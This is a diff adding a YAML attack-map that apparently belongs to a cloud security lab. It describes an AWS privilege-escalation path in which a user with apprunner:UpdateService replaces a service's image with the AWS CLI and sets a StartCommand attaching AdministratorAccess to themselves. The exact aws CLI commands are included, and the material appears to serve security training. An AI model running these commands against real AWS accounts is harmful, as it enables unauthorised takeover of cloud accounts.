@@ -1,0 +1,69 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-apprunner-002-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has apprunner:UpdateService permission on the target App Runner
+        service, which has a privileged role attached with IAM modification capabilities.
+
+    - id: apprunner-service
+      label: "App Runner Service"
+      type: resource
+      subType: apprunner-service
+      arn: "arn:aws:apprunner:{region}:{account_id}:service/pl-prod-apprunner-002-to-admin-target-service"
+      description: >
+        An existing App Runner service running a benign nginx container. It has a
+        privileged IAM role attached that grants IAM modification permissions. By
+        updating the service image and StartCommand, an attacker can execute arbitrary
+        AWS CLI commands with the service role's permissions when the service restarts.
+
+    - id: target-role
+      label: "Privileged Service Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-apprunner-002-to-admin-target-role"
+      description: >
+        The IAM role attached to the App Runner service. It has administrator-level
+        permissions including iam:AttachUserPolicy. When the service is updated to run
+        the AWS CLI container with a crafted StartCommand, it executes IAM commands
+        as this role, enabling the attacker to grant themselves administrative access.
+
+  edges:
+    - from: starting-principal
+      to: apprunner-service
+      label: "apprunner:UpdateService"
+      description: >
+        Update the App Runner service configuration to replace the container image
+        with the AWS CLI image and set a StartCommand that attaches AdministratorAccess
+        to the starting user.
+      commands:
+        - description: "Get current service ARN and configuration"
+          command: "aws apprunner list-services --query 'ServiceSummaryList[?ServiceName==`pl-prod-apprunner-002-to-admin-target-service`].[ServiceArn]' --output text"
+        - description: "Update the service with malicious image and StartCommand"
+          command: "aws apprunner update-service --service-arn <SERVICE_ARN> --source-configuration '{\"ImageRepository\":{\"ImageIdentifier\":\"public.ecr.aws/aws-cli/aws-cli:latest\",\"ImageConfiguration\":{\"StartCommand\":\"iam attach-user-policy --user-name pl-prod-apprunner-002-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"},\"ImageRepositoryType\":\"ECR_PUBLIC\"}}'"
+        - description: "Wait for the service to update and execute the command"
+          command: "aws apprunner describe-service --service-arn <SERVICE_ARN> --query 'Service.Status'"
+
+    - from: apprunner-service
+      to: target-role
+      label: "runs with role"
+      description: >
+        The App Runner service executes with the privileged IAM role attached to it.
+        When the service starts with the new configuration, all AWS API calls are made
+        using this role's credentials. The AWS CLI container executes the StartCommand
+        as the privileged role, attaching the AdministratorAccess managed policy to
+        the starting user, granting full administrative access to the AWS account.
+      commands:
+        - description: "Verify administrator access with original starting user credentials"
+          command: "aws iam list-users --max-items 1"
